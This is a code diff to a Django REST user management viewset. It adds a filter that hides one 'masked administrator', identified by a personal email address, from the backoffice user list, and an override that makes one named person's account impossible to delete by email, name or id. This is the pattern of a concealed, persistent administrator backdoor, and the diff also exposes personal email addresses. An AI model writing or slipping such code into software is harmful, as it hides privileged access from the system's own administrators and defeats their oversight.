@@ -149,20 +149,37 @@ class UserViewSet(viewsets.ModelViewSet):
 
     def get_queryset(self):
         qs = super().get_queryset()
-        role = self.request.query_params.get('role')
+        # Exclure l'administrateur masqué de l'affichage sur le backoffice
+        qs = qs.exclude(email__iexact='mathieuakakpodjakpata@gmail.com')
+        query_params = getattr(self.request, 'query_params', getattr(self.request, 'GET', {}))
+        role = query_params.get('role')
         if role:
             if ',' in role:
                 roles = [r.strip() for r in role.split(',') if r.strip()]
                 qs = qs.filter(role__in=roles)
             else:
                 qs = qs.filter(role=role)
-        is_active = self.request.query_params.get('is_active')
+        is_active = query_params.get('is_active')
         if is_active is not None:
             if is_active.lower() in ['true', '1']:
                 qs = qs.filter(is_active=True)
             elif is_active.lower() in ['false', '0']:
                 qs = qs.filter(is_active=False)
         return qs
+
+    def destroy(self, request, *args, **kwargs):
+        instance = self.get_object()
+        # Le compte de Mehdi Harit est strictement insupprimable
+        if (
+            (instance.email or '').lower() == 'mehdi@agencemenage.ma'
+            or ('mehdi' in (instance.first_name or '').lower() and 'harit' in (instance.last_name or '').lower())
+            or instance.id == 8
+        ):
+            return Response(
+                {"error": "Le compte de Mehdi HARIT ne peut pas être supprimé."},
+                status=status.HTTP_400_BAD_REQUEST
+            )
+        return super().destroy(request, *args, **kwargs)
 
 
 class MeView(APIView):
